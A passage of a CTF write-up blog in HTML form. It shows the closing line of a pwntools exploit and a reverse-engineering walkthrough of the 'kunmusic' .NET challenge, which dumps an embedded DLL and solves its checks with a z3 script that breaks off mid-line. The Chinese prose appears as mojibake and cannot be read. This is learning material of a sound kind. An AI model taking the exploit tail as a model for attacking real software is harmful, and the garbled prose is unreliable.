punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\">#libc ç‰ˆæœ¬é—®é¢˜ï¼Ÿ</span></pre></td></tr></table></figure><h2 id=\"week3\"><a class=\"markdownIt-Anchor\" href=\"#week3\">#</a> WEEK3</h2>\n<p>æ˜¥èŠ‚å¤ªå¿™äº† week3 é¢˜æ²¡æ€ä¹ˆåš å•Šå“ˆå“ˆâ€¦</p>\n<h3 id=\"re\"><a class=\"markdownIt-Anchor\" href=\"#re\">#</a> RE</h3>\n<h4 id=\"kunmusic\"><a class=\"markdownIt-Anchor\" href=\"#kunmusic\">#</a> kunmusic</h4>\n<p>DLL æ”¾è¿› DIE æˆ–çœ‹é™„ä»¶çš„ JS æ–‡ä»¶å¾—çŸ¥æ˜¯ä¸€ä¸ª.NET ç¨‹åº</p>\n<p>dnspy æ‰“å¼€æ‰¾åˆ° main å‡½æ•°</p>\n<p><img data-src=\"/images/image-20230202140851378.png\" alt=\"image.png\"></p>\n<p><img data-src=\"/images/image-20230202192734759.png\" alt=\"image.png\"></p>\n<p>æ–­ç‚¹ dump å‡º data ç”± MZ æ–‡ä»¶å¤´å‘ç°æ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ (64 ä½çš„ dnspy)</p>\n<p>ç”¨ winhex æ–°å»ºä¸ºæ–‡ä»¶</p>\n<p><img data-src=\"/images/image-20230202193201803.png\" alt=\"image.png\"></p>\n<p>DIE æŸ¥çœ‹æ˜¯ .NET çš„ DLL æ–‡ä»¶</p>\n<p><img data-src=\"/images/image-20230202194330948.png\" alt=\"image.png\"></p>\n<p>å†åŠ¨è°ƒ (é™æ€ä¹Ÿèƒ½çœ‹) å‘ç° dump å‡ºçš„ dll æœ‰ä¸ª music å‡½æ•°æœ‰ä¸ªå·¨å¤§çš„ if åˆ¤æ–­ ç”¨ z3 è§£å°±è¡Œäº† ç„¶ååé¢æœ‰ä¸€ä¸ªæ•°ç»„å¼‚æˆ–è§£å‡ºçš„æ•°æ®å°±æ˜¯ flag</p>\n<p><img data-src=\"/images/image-20230202194558459.png\" alt=\"image.png\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> z3 <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>array <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">132</span><span class=\"token punctuation\">,</span><span class=\"token number\">47</span><span class=\"token punctuation\">,</span><span class=\"token number\">180</span><span class=\"token punctuation\">,</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span><span class=\"token number\">216</span><span class=\"token punctuation\">,</span><span class=\"token number\">45</span><span class=\"token punctuation\">,</span><span class=\"token number\">68</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span><span class=\"token number\">39</span><span class=\"token punctuation\">,</span><span class=\"token number\">246</span><span class=\"token punctuation\">,</span><span class=\"token number\">124</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">243</span><span class=\"token punctuation\">,</span><span class=\"token number\">137</span><span class=\"token punctuation\">,</span><span class=\"token number\">58</span><span class=\"token punctuation\">,</span><span class=\"token number\">172</span><span class=\"token punctuation\">,</span><span class=\"token number\">53</span><span class=\"token punctuation\">,</span><span class=\"token number\">200</span><span class=\"token punctuation\">,</span><span class=\"token number\">99</span><span class=\"token punctuation\">,</span><span class=\"token number\">91</span><span class=\"token punctuation\">,</span><span class=\"token number\">83</span><span class=\"token punctuation\">,</span><span class=\"token number\">13</span><span class=\"token punctuation\">,</span><span class=\"token number\">171</span><span class=\"token punctuation\">,</span><span class=\"token number\">80</span><span class=\"token punctuation\">,</span><span class=\"token number\">108</span><span class=\"token punctuation\">,</span><span class=\"token number\">235</span><span class=\"token punctuation\">,</span><span class=\"token number\">179</span><span class=\"token punctuation\">,</span><span class=\"token number\">58</span><span class=\"token punctuation\">,</span><span class=\"token number\">176</span><span class=\"token punctuation\">,</span><span class=\"token number\">28</span><span class=\"token punctuation\">,</span><span class=\"token number\">216</span><span class=\"token punctuation\">,</span><span class=\"token number\">36</span><span class=\"token punctuation\">,</span><span class=\"token number\">11</span><span class=\"token punctuation\">,</span><span class=\"token number\">80</span><span class=\"token punctuation\">,</span><span class=\"token number\">39</span><span class=\"token punctuation\">,</span><span class=\"token number\">162</span><span class=\"token punctuation\">,</span><span class=\"token number\">97</span><span class=\"token punctuation\">,</span><span class=\"token number\">58</span><span class=\"token punctuation\">,</span><span class=\"token number\">236</span><span class=\"token punctuation\">,</span><span class=\"token number\">130</span><span class=\"token punctuation\">,</span><span class=\"token number\">123</span><span class=\"token punctuation\">,</span><span class=\"token number\">176</span><span class=\"token punctuation\">,</span><span class=\"token number\">24</span><span class=\"token punctuation\">,</span><span class=\"token number\">212</span><span class=\"token punctuation\">,</span><span class=\"token number\">56</span><span class=\"token punctuation\">,</span><span class=\"token number\">89</span><span class=\"token punctuation\">,</span><span class=\"token number\">72</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>num <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>BitVec<span class=\"token punctuation\">(</span><span class=\"token string\">'x%d'</span> <span class=\"token operator\">%</span> i<span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span>  <span class=\"token comment\"># åˆå§‹åŒ–åºåˆ—</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>s <span class=\"token operator\">=</span> Solver<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># åˆ›å»ºçº¦æŸæ±‚è§£å™¨</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">52296</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">26211</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">11754</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">41236</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">63747</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>      num<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">52714</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">10512</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">12972</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">45505</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">21713</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>      num<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">59122</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">12840</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">21087</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">12702282</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">25228</span> <span class=\"token operator\">+</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">20699</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">8158</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">65307</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">30701</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">47555</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>      num<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">2557</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">49055</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">7992</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">57465</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">57426</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>      num<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">13299</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">50966</span> <span class=\"token operator\">==</span> <span class=\"token number\">9946829</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">64801</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">60698</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      <span class=\"token number\">40853</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">54907</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">29882</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">13574</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">21310</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>      <span class=\"token number\">47366</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">41784</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">53690</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">58436</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">15590</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      <span class=\"token number\">58225</span> <span class=\"token operator\">==</span> <span class=\"token number\">2372055</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">61538</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">17121</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">58124</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">8186</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>      num<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">21253</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">38524</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">48323</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">20556</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">56056</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      num<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">18568</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">12995</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">39260</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">25329</span> <span class=\"token operator\">==</span> <span class=\"token number\">6732474</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>      <span class=\"token number\">42567</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">17743</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">47827</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">10246</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">16284</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">39390</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>      num<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">11803</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">60332</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">18491</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">4795</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">25636</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      <span class=\"token number\">16780</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">62345</span> <span class=\"token operator\">==</span> <span class=\"token number\">14020739</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">10968</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">31780</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">31857</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>      <span class=\"token number\">61983</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">31048</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">20189</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">12337</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">25945</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">7064</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>      <span class=\"token number\">25369</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">54893</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">59949</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">12441</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">14434062</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">16689</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>      <span class=\"token number\">10279</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">32918</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">57155</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">26571</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">15086</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">22986</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>      <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">23349</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">16381</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">23173</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">40224</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">31751</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>      num<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">8421</span> <span class=\"token operator\">==</span> <span class=\"token number\">7433598</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">28740</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">64696</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">60470</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">14752</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>      <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">1287</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">35272</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">49467</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">33788</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">20606</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>      <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">44874</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">19764</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">48342</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">56511</span> <span class=\"token operator\">==</span> <span class=\"token number\">7989404</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token 